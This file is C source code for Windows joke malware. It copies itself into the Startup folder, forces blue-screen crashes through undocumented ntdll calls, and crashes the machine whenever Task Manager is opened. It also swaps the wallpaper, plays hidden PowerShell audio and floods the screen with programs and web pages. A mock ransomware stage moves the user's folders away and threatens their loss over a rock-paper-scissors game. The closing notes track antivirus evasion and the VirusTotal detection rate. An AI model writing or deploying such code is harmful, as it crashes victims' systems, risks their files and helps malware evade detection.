#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>

#define IMPORT_BIN(sect, file, sym) asm(    \
	".section " #sect "\n"                  \
	".balign 4\n"                           \
	".global " #sym "\n" #sym ":\n"         \
	".incbin \"" file "\"\n"                \
	".global _sizeof_" #sym "\n"            \
	".set _sizeof_" #sym ", . - " #sym "\n" \
	".balign 4\n"                           \
	".section \".text\"\n")

void CrashSystem()
{
	HMODULE ntdll = LoadLibrary("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
	long int (*NtSetInformationProcess)(HANDLE, int, void *, unsigned long int);
	*(FARPROC *)&NtSetInformationProcess = GetProcAddress(ntdll, "NtSetInformationProcess");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL)
	{
		BOOLEAN Tom;
		DWORD Jerry;
		((void (*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19L, 1, 0, &Tom);
		((void (*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000000, 0, 0, 0, 6, &Jerry);
	}

	if (RtlAdjustPrivilege && NtSetInformationProcess)
	{
		unsigned char Oogway;
		unsigned long int Critical = 1;
		((void (*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(20L, 1, 0, &Oogway);
		NtSetInformationProcess((void *)-1, 29, &Critical, sizeof Critical);
	}
}

void SelfDefence()
{
	char *TaskManager = "Taskmgr.exe";
	char *tasklist = "tasklist.exe";

	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	BOOL b = Process32First(h, &pe);

	while (b)
	{
		if (strcmp(pe.szExeFile, TaskManager) == 0 || strcmp(pe.szExeFile, tasklist) == 0)
		{
			CrashSystem();
			return;
		}
		b = Process32Next(h, &pe);
	}
}

void ExtractMusic(char *MusicPath)
{
	IMPORT_BIN(".rodata", "source/music.wav", Music);
	extern const char Music[], _sizeof_Music[];

	FILE *fp = fopen(MusicPath, "wb");
	fwrite(Music, 1, (intptr_t)_sizeof_Music, fp);
	fclose(fp);
}

void ChangeBackgroundImage(char *BackgroundImagePath, char *CurrentWallpaper, char *BackupWallpaper)
{
	CopyFile(CurrentWallpaper, BackupWallpaper, FALSE);

	IMPORT_BIN(".rodata", "source/background.png", BackgroundImage);
	extern const char BackgroundImage[], _sizeof_BackgroundImage[];

	FILE *fp = fopen(BackgroundImagePath, "wb");
	fwrite(BackgroundImage, 1, (intptr_t)_sizeof_BackgroundImage, fp);
	fclose(fp);

	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, BackgroundImagePath, SPIF_UPDATEINIFILE);
}

void OpenWebpages(int RandomWebpage)
{
	char *Webpages[5];
	Webpages[0] = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
	Webpages[1] = "https://www.youtube.com/watch?v=9bZkp7q19f0";
	Webpages[2] = "https://www.youtube.com/watch?v=YFXlzKDjL8E";
	Webpages[3] = "https://www.youtube.com/watch?v=6ZfuNTqbHE8";
	Webpages[4] = "https://www.youtube.com/watch?v=QH2-TGUlwu4";

	ShellExecute(NULL, "open", Webpages[RandomWebpage], NULL, NULL, SW_SHOWNORMAL);
}

void OpenPrograms(int RandomProgram)
{
	char *Applications[8];
	Applications[0] = "calc.exe";
	Applications[1] = "notepad.exe";
	Applications[2] = "write.exe";
	Applications[3] = "explorer.exe";
	Applications[4] = "msconfig.exe";
	Applications[5] = "mspaint.exe";
	Applications[6] = "devmgmt.msc";
	Applications[7] = "control.exe";

	ShellExecute(NULL, "open", Applications[RandomProgram], NULL, NULL, SW_SHOWNORMAL);
}

void Payloads()
{
	/*
		$PlayWav = New-Object System.Media.SoundPlayer;
		$MusicPath = "$env:USERPROFILE\\music.wav";
		$PlayWav.SoundLocation = $MusicPath;
		$PlayWav.playsync()
	*/

	// bruh those escape characters are so annoying lol
	ShellExecute(NULL, "open", "cmd.exe", "/c powershell.exe \"$PlayWav = New-Object System.Media.SoundPlayer; $MusicPath = \\\"$env:USERPROFILE\\\\music.wav\\\"; $PlayWav.SoundLocation = $MusicPath; $PlayWav.playsync()\"", NULL, SW_HIDE);

	for (int i = 0; i < 69; i++)
	{
		int RandomWebpage = rand() % 5;
		OpenWebpages(RandomWebpage);
		Sleep(690);

		int RandomProgram = rand() % 8;
		OpenPrograms(RandomProgram);
		Sleep(690);
		SelfDefence();
	}
}

void RockPaperScissors()
{
	int UserChoice;
	int Win = 0;

	MessageBox(NULL, "Let us play a simple game that everyone knows.\r\rYou will be asked to give one of the following answers:\rYes, No, or Cancel.\r\rYes will be rock.\rNo will be paper.\rCancel will be scissors.\r\rIf you win at least 2 out of 3 times, you pass and your files are decrypted.\rBut if you lose, you lose all your files.\r\rIf you try to kill my process or shutdown, the decrypt key in memory will be lost and your files will be useless, so dont try anything stupid!\r\rGood luck, buddy!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);

	for (int i = 0; i < 3; i++)
	{

		int ComputerChoice = rand() % 3;
		UserChoice = MessageBox(NULL, "Choose Rock, Paper, or Scissors!", "Rock, Paper, Scissors!", MB_YESNOCANCEL | MB_ICONQUESTION);

		if (UserChoice == IDYES)
		{
			if (ComputerChoice == 0)
			{
				MessageBox(NULL, "You chose Rock, and the computer chose Rock! It's a tie!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
				i -= 1;
			}
			else if (ComputerChoice == 1)
			{
				MessageBox(NULL, "You chose Rock, and the computer chose Paper! You lose!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
			}
			else if (ComputerChoice == 2)
			{
				MessageBox(NULL, "You chose Rock, and the computer chose Scissors! You win!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
				Win += 1;
			}
		}
		else if (UserChoice == IDNO)
		{
			if (ComputerChoice == 0)
			{
				MessageBox(NULL, "You chose Paper, and the computer chose Rock! You win!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
				Win += 1;
			}
			else if (ComputerChoice == 1)
			{
				MessageBox(NULL, "You chose Paper, and the computer chose Paper! It's a tie!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
				i -= 1;
			}
			else if (ComputerChoice == 2)
			{
				MessageBox(NULL, "You chose Paper, and the computer chose Scissors! You lose!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
			}
		}
		else if (UserChoice == IDCANCEL)
		{
			if (ComputerChoice == 0)
			{
				MessageBox(NULL, "You chose Scissors, and the computer chose Rock! You lose!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
			}
			else if (ComputerChoice == 1)
			{
				MessageBox(NULL, "You chose Scissors, and the computer chose Paper! You win!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
				Win += 1;
			}
			else if (ComputerChoice == 2)
			{
				MessageBox(NULL, "You chose Scissors, and the computer chose Scissors! It's a tie!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
				i -= 1;
			}
		}
	}

	if (Win >= 2)
	{
		MessageBox(NULL, "YOU WIN!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
	}
	else
	{
		MessageBox(NULL, "YOU LOSE!\rBut hey, I'll decrypt your files anyway, give me a second, just click on Ok!", "Rock, Paper, Scissors!", MB_OK | MB_ICONINFORMATION);
	}
}

void CheckUser()
{
	char *Username = getenv("USERNAME");
	if (strcmp(Username, "user") == 0)
	{
		MessageBox(NULL, "You are not allowed to run this program!", "Error", MB_OK | MB_ICONERROR);
		RockPaperScissors();
		ExitProcess(0);
	}
}

void CreateBackup()
{
	// MessageBox(NULL, "Creating backup of your files.", "Creating Backup", MB_OK | MB_ICONINFORMATION); DEBUG
	char DesktopFiles[MAX_PATH];
	char DocumentsFiles[MAX_PATH];
	char DownloadsFiles[MAX_PATH];
	char PicturesFiles[MAX_PATH];
	char VideosFiles[MAX_PATH];
	char MusicFiles[MAX_PATH];

	char DesktopFilesBackup[MAX_PATH];
	char DocumentsFilesBackup[MAX_PATH];
	char DownloadsFilesBackup[MAX_PATH];
	char PicturesFilesBackup[MAX_PATH];
	char VideosFilesBackup[MAX_PATH];
	char MusicFilesBackup[MAX_PATH];

	GetEnvironmentVariable("USERPROFILE", DesktopFiles, MAX_PATH);
	strcat(DesktopFiles, "\\Desktop\\*");

	GetEnvironmentVariable("USERPROFILE", DocumentsFiles, MAX_PATH);
	strcat(DocumentsFiles, "\\Documents\\*");

	GetEnvironmentVariable("USERPROFILE", DownloadsFiles, MAX_PATH);
	strcat(DownloadsFiles, "\\Downloads\\*");

	GetEnvironmentVariable("USERPROFILE", PicturesFiles, MAX_PATH);
	strcat(PicturesFiles, "\\Pictures\\*");

	GetEnvironmentVariable("USERPROFILE", VideosFiles, MAX_PATH);
	strcat(VideosFiles, "\\Videos\\*");

	GetEnvironmentVariable("USERPROFILE", MusicFiles, MAX_PATH);
	strcat(MusicFiles, "\\Music\\*");

	GetEnvironmentVariable("USERPROFILE", DesktopFilesBackup, MAX_PATH);
	strcat(DesktopFilesBackup, "\\BACKUP-666\\Desktop\\");

	GetEnvironmentVariable("USERPROFILE", DocumentsFilesBackup, MAX_PATH);
	strcat(DocumentsFilesBackup, "\\BACKUP-666\\Documents\\");

	GetEnvironmentVariable("USERPROFILE", DownloadsFilesBackup, MAX_PATH);
	strcat(DownloadsFilesBackup, "\\BACKUP-666\\Downloads\\");

	GetEnvironmentVariable("USERPROFILE", PicturesFilesBackup, MAX_PATH);
	strcat(PicturesFilesBackup, "\\BACKUP-666\\Pictures\\");

	GetEnvironmentVariable("USERPROFILE", VideosFilesBackup, MAX_PATH);
	strcat(VideosFilesBackup, "\\BACKUP-666\\Videos\\");

	GetEnvironmentVariable("USERPROFILE", MusicFilesBackup, MAX_PATH);
	strcat(MusicFilesBackup, "\\BACKUP-666\\Music\\");

	/*
	if (CreateDirectory(Home, NULL) == 0)
	{
		strcat(Home, "-1");
		CreateDirectory(Home, NULL);
	}*/

	/*
	SHFILEOPSTRUCT FileOp;
	FileOp.hwnd = NULL;
	FileOp.wFunc = FO_MOVE;
	FileOp.pFrom = Userfiles;
	FileOp.pTo = Home;
	FileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_SILENT;
	FileOp.fAnyOperationsAborted = FALSE;
	FileOp.lpszProgressTitle = NULL;
	FileOp.hNameMappings = NULL;

	SHFileOperation(&FileOp);
	*/

	for (int i = 0; i < 6; i++)
	{
		SHFILEOPSTRUCT FileOp;
		FileOp.hwnd = NULL;
		FileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_SILENT;
		FileOp.fAnyOperationsAborted = FALSE;
		FileOp.lpszProgressTitle = NULL;
		FileOp.hNameMappings = NULL;

		if (i == 0)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = DesktopFiles;
			FileOp.pTo = DesktopFilesBackup;
		}
		else if (i == 1)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = DocumentsFiles;
			FileOp.pTo = DocumentsFilesBackup;
		}
		else if (i == 2)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = DownloadsFiles;
			FileOp.pTo = DownloadsFilesBackup;
		}
		else if (i == 3)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = PicturesFiles;
			FileOp.pTo = PicturesFilesBackup;
		}
		else if (i == 4)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = VideosFiles;
			FileOp.pTo = VideosFilesBackup;
		}
		else if (i == 5)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = MusicFiles;
			FileOp.pTo = MusicFilesBackup;
		}

		SHFileOperation(&FileOp);
	}

	// MessageBox(NULL, "Userfiles moved to backup folder", "Success", MB_OK); DEBUG
}

void LoadBackup()
{
	// MessageBox(NULL, "Loading backup", "Success", MB_OK); DEBUG
	char DesktopFiles[MAX_PATH];
	char DocumentsFiles[MAX_PATH];
	char DownloadsFiles[MAX_PATH];
	char PicturesFiles[MAX_PATH];
	char VideosFiles[MAX_PATH];
	char MusicFiles[MAX_PATH];

	char DesktopFilesBackup[MAX_PATH];
	char DocumentsFilesBackup[MAX_PATH];
	char DownloadsFilesBackup[MAX_PATH];
	char PicturesFilesBackup[MAX_PATH];
	char VideosFilesBackup[MAX_PATH];
	char MusicFilesBackup[MAX_PATH];

	GetEnvironmentVariable("USERPROFILE", DesktopFilesBackup, MAX_PATH);
	strcat(DesktopFilesBackup, "\\BACKUP-666\\Desktop\\*");

	GetEnvironmentVariable("USERPROFILE", DocumentsFilesBackup, MAX_PATH);
	strcat(DocumentsFilesBackup, "\\BACKUP-666\\Documents\\*");

	GetEnvironmentVariable("USERPROFILE", DownloadsFilesBackup, MAX_PATH);
	strcat(DownloadsFilesBackup, "\\BACKUP-666\\Downloads\\*");

	GetEnvironmentVariable("USERPROFILE", PicturesFilesBackup, MAX_PATH);
	strcat(PicturesFilesBackup, "\\BACKUP-666\\Pictures\\*");

	GetEnvironmentVariable("USERPROFILE", VideosFilesBackup, MAX_PATH);
	strcat(VideosFilesBackup, "\\BACKUP-666\\Videos\\*");

	GetEnvironmentVariable("USERPROFILE", MusicFilesBackup, MAX_PATH);
	strcat(MusicFilesBackup, "\\BACKUP-666\\Music\\*");

	GetEnvironmentVariable("USERPROFILE", DesktopFiles, MAX_PATH);
	strcat(DesktopFiles, "\\Desktop");

	GetEnvironmentVariable("USERPROFILE", DocumentsFiles, MAX_PATH);
	strcat(DocumentsFiles, "\\Documents");

	GetEnvironmentVariable("USERPROFILE", DownloadsFiles, MAX_PATH);
	strcat(DownloadsFiles, "\\Downloads");

	GetEnvironmentVariable("USERPROFILE", PicturesFiles, MAX_PATH);
	strcat(PicturesFiles, "\\Pictures");

	GetEnvironmentVariable("USERPROFILE", VideosFiles, MAX_PATH);
	strcat(VideosFiles, "\\Videos");

	GetEnvironmentVariable("USERPROFILE", MusicFiles, MAX_PATH);
	strcat(MusicFiles, "\\Music");

	for (int i = 0; i < 6; i++)
	{
		SHFILEOPSTRUCT FileOp;
		FileOp.hwnd = NULL;
		FileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_SILENT;
		FileOp.fAnyOperationsAborted = FALSE;
		FileOp.lpszProgressTitle = NULL;
		FileOp.hNameMappings = NULL;

		if (i == 0)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = DesktopFilesBackup;
			FileOp.pTo = DesktopFiles;
		}
		else if (i == 1)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = DocumentsFilesBackup;
			FileOp.pTo = DocumentsFiles;
		}
		else if (i == 2)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = DownloadsFilesBackup;
			FileOp.pTo = DownloadsFiles;
		}
		else if (i == 3)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = PicturesFilesBackup;
			FileOp.pTo = PicturesFiles;
		}
		else if (i == 4)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = VideosFilesBackup;
			FileOp.pTo = VideosFiles;
		}
		else if (i == 5)
		{
			FileOp.wFunc = FO_MOVE;
			FileOp.pFrom = MusicFilesBackup;
			FileOp.pTo = MusicFiles;
		}

		SHFileOperation(&FileOp);
	}

	// MessageBox(NULL, "DELETING", "INFO", MB_OK); DEBUG
	char BackupFolder[MAX_PATH];
	GetEnvironmentVariable("USERPROFILE", BackupFolder, MAX_PATH);
	strcat(BackupFolder, "\\BACKUP-666");

	SHFILEOPSTRUCT FileOp;
	FileOp.hwnd = NULL;
	FileOp.wFunc = FO_DELETE;
	FileOp.pFrom = BackupFolder;
	FileOp.pTo = NULL;
	FileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_SILENT;
	FileOp.fAnyOperationsAborted = FALSE;
	FileOp.lpszProgressTitle = NULL;
	FileOp.hNameMappings = NULL;

	SHFileOperation(&FileOp);

	// MessageBox(NULL, "Userfiles moved from backup folder", "Success", MB_OK); DEBUG
}

void LastStage()
{
	CreateBackup();
	RockPaperScissors();
	LoadBackup();
}

void RestoreEverything(char *DeleteFilePath, char *MusicPath, char *BackgroundImagePath, char *CurrentWallpaper, char *BackupWallpaper, char *StartupExecutable)
{
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, BackupWallpaper, SPIF_UPDATEINIFILE);

	Sleep(500);
	DeleteFile(DeleteFilePath);
	DeleteFile(MusicPath);
	DeleteFile(BackgroundImagePath);
	DeleteFile(CurrentWallpaper);
	DeleteFile(BackupWallpaper);

	char TempFile[MAX_PATH];
	GetEnvironmentVariable("TEMP", TempFile, MAX_PATH);
	strcat(TempFile, "\\DELETE");

	if (GetFileAttributes(TempFile) != INVALID_FILE_ATTRIBUTES)
	{
		DeleteFile(TempFile);
	}

	MoveFile(StartupExecutable, TempFile);
	ShellExecute(NULL, "open", "cmd.exe", "/c start /b \"\" powershell.exe Start-Sleep -Seconds 3; Remove-Item $env:TEMP\\DELETE -Force -ErrorAction SilentlyContinue", NULL, SW_HIDE);
}

int main(void)
{
	CheckUser();
	SelfDefence();

	char CurrentExecutable[MAX_PATH];
	GetModuleFileName(NULL, CurrentExecutable, MAX_PATH);

	char StartupExecutable[MAX_PATH];
	GetEnvironmentVariable("APPDATA", StartupExecutable, MAX_PATH);
	strcat(StartupExecutable, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe");

	char DeleteFilePath[MAX_PATH];
	GetEnvironmentVariable("USERPROFILE", DeleteFilePath, MAX_PATH);
	strcat(DeleteFilePath, "\\DELETE");

	char MusicPath[MAX_PATH];
	GetEnvironmentVariable("USERPROFILE", MusicPath, MAX_PATH);
	strcat(MusicPath, "\\music.wav");

	char BackgroundImagePath[MAX_PATH];
	GetEnvironmentVariable("USERPROFILE", BackgroundImagePath, MAX_PATH);
	strcat(BackgroundImagePath, "\\background.png");

	char BackupWallpaper[MAX_PATH];
	GetEnvironmentVariable("USERPROFILE", BackupWallpaper, MAX_PATH);
	strcat(BackupWallpaper, "\\wallpaper.bmp");

	char CurrentWallpaper[MAX_PATH];
	SystemParametersInfo(SPI_GETDESKWALLPAPER, MAX_PATH, CurrentWallpaper, 0);

	if (GetFileAttributes(DeleteFilePath) != INVALID_FILE_ATTRIBUTES)
	{
		LastStage();
		RestoreEverything(DeleteFilePath, MusicPath, BackgroundImagePath, CurrentWallpaper, BackupWallpaper, StartupExecutable);
		ExitProcess(0);
	}

	if (strcmp(CurrentExecutable, StartupExecutable) == 0)
	{
		FILE *fp = fopen(DeleteFilePath, "w");
		fclose(fp);

		Payloads();
		CrashSystem();
	}

	if (MessageBox(NULL, "If you see this message without knowing what you have just executed, just press No and nothing will happen.", "Would you like to run this program?", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES &&
		MessageBox(NULL, "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THE USE OF THIS PROGRAM!\r\n\r\nIF YOU STILL WANT TO RUN THIS FILE, PLEASE SAVE ALL UNSAVED FILES (ETC.)!\r\n\r\nEXECUTE IT ANYWAY?",
				   "THIS IS THE LAST WARNING!", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES)
	{
		MoveFile(CurrentExecutable, StartupExecutable);
		ExtractMusic(MusicPath);
		ChangeBackgroundImage(BackgroundImagePath, CurrentWallpaper, BackupWallpaper);

		CrashSystem();
	}
}

/* WORKING ON
				Ransomeware Part
DONE				-> Creating Rock Paper Scissors game
PARTIAL				-> Moving all user files (inside Desktop, Documents, Downloads, Pictures, Videos, Music) to home directory
						-> ERROR | SOMETIMES ONE TO TWO FILES AREN'T MOVED
					-> Creating fake dummy files
DONE				-> now battle 3 rounds of rock paper scissors
DONE				-> if you win, you get to keep your files
DONE				-> if you lose, you also keep all your files
DONE				-> if you draw, you need get one extra try
*/

/* TODO
DONE			- adding method to remove the leftover from temp
DONE (warning)	- adding method to choose between BSOD or doing nothing
DONE			- replacing the encoded powershell script (av evasion)

				- compiling project using tcc instead of gcc
					-> using linker instead of incbin asm (tcc doesn't like incbin)
						->	ld -r -b binary -o wallpaper.o wallpaper.png
							extern const int _binary_wallpaper_png_size;
							extern const char _binary_wallpaper_png_end;
							extern const char _binary_wallpaper_png_start;

				- maybe adding more payloads (MessageBoxes, etc.)
DONE			- maybe add a highscore system like in "Rensenware"
				- maybe adding a different song instead (satanic vibes)
				- maybe getting the VirusTotal detection rate to 0
					- current detection rate: 1/71
*/
